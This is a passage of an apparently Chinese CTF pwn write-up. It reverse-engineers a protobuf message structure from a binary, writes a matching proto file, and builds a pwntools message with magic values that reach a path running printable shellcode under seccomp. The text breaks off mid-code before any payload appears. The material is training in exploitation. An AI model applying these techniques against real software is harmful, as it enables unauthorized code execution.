    <content type="html"><![CDATA[<p>本题来源于源鲁杯第一轮<code>pwn</code>的困难题，向程序发送了<code>msg</code>之后会判定是否符合<code>proto</code>结构，符合则开启沙箱仅允许执行<code>read、write、fstat、alarm、exit_group</code>，并执行<code>msg</code>里的<code>shellcode</code>，<code>shellcode</code>要求范围在可见字符且长度不大于<code>0xc7</code></p><h2 id="protobuf结构体"><a href="#protobuf结构体" class="headerlink" title="protobuf结构体"></a>protobuf结构体</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="protobuf结构体-x2F-proto文件示例"><a href="#protobuf结构体-x2F-proto文件示例" class="headerlink" title="protobuf结构体&#x2F;proto文件示例"></a>protobuf结构体&#x2F;proto文件示例</h4><p><code>protobuf</code>结构体示例：<code>device.proto</code>，由<code>protobuf</code>版本（<code>proto2 / proto3</code>）和<code>protobuf</code>结构体构成</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">devicemsg</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> actionid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgidx <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgsize <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">bytes</span>  msgcontent <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="protobuf参数的结构体定义"><a href="#protobuf参数的结构体定义" class="headerlink" title="protobuf参数的结构体定义"></a>protobuf参数的结构体定义</h4><p><code>protobuf</code>参数的结构体定义如下，其中需要注意的是前四项，在<code>.data.rel.ro</code>段中可以看到每个参数的结构体，根据结构体中的值判断参数类型等信息，从而分析得到<code>protobuf</code>结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCFieldDescriptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token class-name">uint32_t</span>id<span class="token punctuation">;</span>ProtobufCLabel  label<span class="token punctuation">;</span>ProtobufCTypetype<span class="token punctuation">;</span><span class="token keyword">unsigned</span>quantifier_offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span>offset<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span>descriptor<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span>default_value<span class="token punctuation">;</span><span class="token class-name">uint32_t</span>flags<span class="token punctuation">;</span><span class="token keyword">unsigned</span>reserved_flags<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span>reserved2<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span>reserved3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以示例中的<code>required sint64 actionid = 1;</code>为例，分别对应结构体前四项：<code>name</code>值为<code>actionid</code>，<code>id</code>值为<code>1</code>，<code>label</code>值为<code>required</code>，<code>type</code>值为<code>sint64</code>，<strong>即在编写<code>proto</code>文件时是按照<code>label type name = id</code>的顺序写的</strong></p><p><code>label</code>存在以下类型，即<code>required</code>、<code>optional</code>、<code>repeated</code>、<code>none</code>，从单词含义也能看出对应什么类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-3</code>，**只有版本为<code>proto2</code>时才需要考虑<code>label</code>**，<code>proto3</code>的<code>label</code>都是<code>none</code>（即数值为<code>3</code>）且不需要在<code>proto</code>文件中写出来</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>PROTOBUF_C_LABEL_REQUIRED<span class="token punctuation">,</span>PROTOBUF_C_LABEL_OPTIONAL<span class="token punctuation">,</span>PROTOBUF_C_LABEL_REPEATED<span class="token punctuation">,</span>PROTOBUF_C_LABEL_NONE<span class="token punctuation">,</span><span class="token punctuation">&#125;</span> ProtobufCLabel<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>type</code>存在以下类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-0x10</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>PROTOBUF_C_TYPE_INT32<span class="token punctuation">,</span>      <span class="token comment">/**&lt; int32 */</span>PROTOBUF_C_TYPE_SINT32<span class="token punctuation">,</span>     <span class="token comment">/**&lt; signed int32 */</span>PROTOBUF_C_TYPE_SFIXED32<span class="token punctuation">,</span>   <span class="token comment">/**&lt; signed int32 (4 bytes) */</span>PROTOBUF_C_TYPE_INT64<span class="token punctuation">,</span>      <span class="token comment">/**&lt; int64 */</span>PROTOBUF_C_TYPE_SINT64<span class="token punctuation">,</span>     <span class="token comment">/**&lt; signed int64 */</span>PROTOBUF_C_TYPE_SFIXED64<span class="token punctuation">,</span>   <span class="token comment">/**&lt; signed int64 (8 bytes) */</span>PROTOBUF_C_TYPE_UINT32<span class="token punctuation">,</span>     <span class="token comment">/**&lt; unsigned int32 */</span>PROTOBUF_C_TYPE_FIXED32<span class="token punctuation">,</span>    <span class="token comment">/**&lt; unsigned int32 (4 bytes) */</span>PROTOBUF_C_TYPE_UINT64<span class="token punctuation">,</span>     <span class="token comment">/**&lt; unsigned int64 */</span>PROTOBUF_C_TYPE_FIXED64<span class="token punctuation">,</span>    <span class="token comment">/**&lt; unsigned int64 (8 bytes) */</span>PROTOBUF_C_TYPE_FLOAT<span class="token punctuation">,</span>      <span class="token comment">/**&lt; float */</span>PROTOBUF_C_TYPE_DOUBLE<span class="token punctuation">,</span>     <span class="token comment">/**&lt; double */</span>PROTOBUF_C_TYPE_BOOL<span class="token punctuation">,</span>       <span class="token comment">/**&lt; boolean */</span>PROTOBUF_C_TYPE_ENUM<span class="token punctuation">,</span>       <span class="token comment">/**&lt; enumerated type */</span>PROTOBUF_C_TYPE_STRING<span class="token punctuation">,</span>     <span class="token comment">/**&lt; UTF-8 or ASCII string */</span>PROTOBUF_C_TYPE_BYTES<span class="token punctuation">,</span>      <span class="token comment">/**&lt; arbitrary byte sequence */</span>PROTOBUF_C_TYPE_MESSAGE<span class="token punctuation">,</span>    <span class="token comment">/**&lt; nested message */</span><span class="token punctuation">&#125;</span> ProtobufCType<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判定protobuf版本"><a href="#判定protobuf版本" class="headerlink" title="判定protobuf版本"></a>判定protobuf版本</h4><ul><li><p>根据结构体参数数量和实际数量是否一致判断</p><p>在<code>.data.rel.ro</code>段的结构体名下面两项分别是结构体大小和结构体参数数量，<code>proto2</code>比<code>proto3</code>多了<code>default_value</code>字段，所以参数数量会比实际参数数量多一个</p></li><li><p>根据参数结构体有无<code>label</code></p><p><code>proto2</code>中必须声明参数的<code>label</code>，所以<code>label</code>值存在除<code>none</code>（即<code>3</code>）以外的值就是<code>proto2</code></p></li></ul><h4 id="编译proto文件"><a href="#编译proto文件" class="headerlink" title="编译proto文件"></a>编译proto文件</h4><p>使用<code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. filename.proto</code>来编译<code>filename.proto</code>，需要先安装<code>grpcio-tools</code>，编译后得到<code>filename_pb2.py</code>和<code>filename_pb2_grpc.py</code>，编译后在<code>exp</code>中导入<code>filename_pb2</code>即可使用结构体来发送消息</p><p>编译后的结构体会比原结构体多<code>ProtobufCMessage base;</code>，<code>ProtobufCMessage</code>结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCMessage</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> ProtobufCMessageDescriptor<span class="token operator">*</span>descriptor<span class="token punctuation">;</span><span class="token keyword">unsigned</span>n_unknown_fields<span class="token punctuation">;</span>ProtobufCMessageUnknownField<span class="token operator">*</span>unknown_fields<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>所以编译后我们定义的参数在数组中的下标是从<code>3</code>开始的</strong></p><h4 id="使用pbtk获取protobuf结构体"><a href="#使用pbtk获取protobuf结构体" class="headerlink" title="使用pbtk获取protobuf结构体"></a>使用pbtk获取protobuf结构体</h4><p>工具地址：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><p>使用工具可以快速获取<code>protobuf</code>结构体省去手搓<code>proto</code>文件的麻烦，安装的时候有报错可以直接问<code>gpt</code>解决，但是有的题目被作者刻意隐藏了<code>protobuf</code>特征而无法用工具梭，还是需要手搓</p><h3 id="结构体分析"><a href="#结构体分析" class="headerlink" title="结构体分析"></a>结构体分析</h3><p>在<code>IDA</code>中找到了<code>_data_rel_ro</code>段，<code>name</code>在<code>;</code>右边，下面第一个数值为<code>id</code>，<code>2-5</code>是<code>label</code>，<code>6-9</code>是<code>type</code>，对应枚举中的类型可以得到结构体参数的类型，这里一共有<code>msgid</code>、<code>msgsize</code>、<code>msgcontent</code>三个参数，而<code>qword_3C60</code>结构体名称下面的结构体参数数量也是<code>3</code>，所以<code>protobuf</code>版本为<code>proto3</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80 _data_rel_ro    segment align_32 public <span class="token char">'DATA'</span> use64<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                 assume cs<span class="token operator">:</span>_data_rel_ro<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                 <span class="token punctuation">;</span>org <span class="token number">3</span>B80h<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80 off_3B80        dq offset aMsgid        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98↓o<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                                         <span class="token punctuation">;</span> <span class="token string">"msgid"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B88                 db    <span class="token number">1</span>#id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B89                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8A                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8B                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8C                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8D                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8E                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8F                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B90                 db    <span class="token number">3</span>#type<span class="token operator">=</span>int64<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BC8                 dq offset aMsgsize      <span class="token punctuation">;</span> <span class="token string">"msgsize"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD0                 db    <span class="token number">2</span>#id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD1                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD2                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD3                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD4                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD5                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD6                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD7                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD8                 db    <span class="token number">3</span>#type<span class="token operator">=</span>int64<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C10                 dq offset aMsgcontent   <span class="token punctuation">;</span> <span class="token string">"msgcontent"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C18                 db    <span class="token number">3</span>#id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C19                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1A                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1B                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1C                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1D                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1E                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1F                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C20                 db  <span class="token number">0F</span>h#type<span class="token operator">=</span>bytes<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C60 qword_3C60      dq <span class="token number">28</span>AAEEF9h            <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_1819<span class="token operator">+</span><span class="token number">10</span>↑o<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C60                                         <span class="token punctuation">;</span> sub_187D<span class="token operator">+</span><span class="token number">17</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C68                 dq offset aBotMsgbot    <span class="token punctuation">;</span> <span class="token string">"bot.msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C70                 dq offset aMsgbot       <span class="token punctuation">;</span> <span class="token string">"Msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C78                 dq offset aBotMsgbot_0  <span class="token punctuation">;</span> <span class="token string">"Bot__Msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C80                 dq offset aBot          <span class="token punctuation">;</span> <span class="token string">"bot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C88                 dq <span class="token number">38</span>h#结构体大小<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C90                 dq <span class="token number">3</span>#字段数<span class="token operator">=</span>实际字段数，是proto3<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98                 dq offset off_3B80      <span class="token punctuation">;</span> <span class="token string">"msgid"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA0                 dq offset unk_20A0<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA8                 dq <span class="token number">1</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CB0                 dq offset unk_20B0<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CB8                 dq offset sub_1819<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17 _data_rel_ro    ends<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编写和编译proto文件"><a href="#编写和编译proto文件" class="headerlink" title="编写和编译proto文件"></a>编写和编译proto文件</h3><p>根据以上分析编写<code>bot.proto</code> 内容如下</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">Msgbot</span><span class="token punctuation">&#123;</span>    <span class="token builtin">int64</span> msgid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token builtin">int64</span> msgsize <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token builtin">bytes</span> msgcontent <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. bot.proto</code>编译得到<code>bot_pb2.py</code>和<code>bot_pb2_grpc.py</code>，在<code>exp</code>中导入<code>bot_pb2</code>即可使用<code>bot_pb2</code>中的<code>Msgbot</code>来发送题目特定格式的消息，需要注意的是发送前需要先用<code>SerializeToString</code>序列化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpcmsg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token builtin">id</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> sizemsg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> contentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在发送的消息能被正确接收之后当<code>msg[0][3] == (void *)0xC0DEFEEDLL</code>且<code>msg[0][4] == (void *)0xF00DFACELL</code>、<code>msg[0][5] &lt;= 0xC7</code>时将<code>msg[0] + 6</code>复制到<code>dest</code>中作为<code>shellcode</code>执行，<code>msg[0][3]</code>就是<code>msgid</code>，<code>msg[0][4]</code>是<code>msgsize</code>，<code>msg[0] + 6</code>是<code>msgcontent</code>，<code>msg[0][5]</code>获取了<code>msgcontent</code>的长度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xC0DEFEEDLL</span> <span class="token operator">&amp;&amp;</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xF00DFACELL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> v0<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_C0 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">&amp;&amp;</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0xC7</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dest<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以构造结构体如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpcmsg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> shellcodeserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>check</code>函数对<code>shellcode</code>进行了检查，限制<code>shellcode</code>在可见字符范围内</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> i <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span 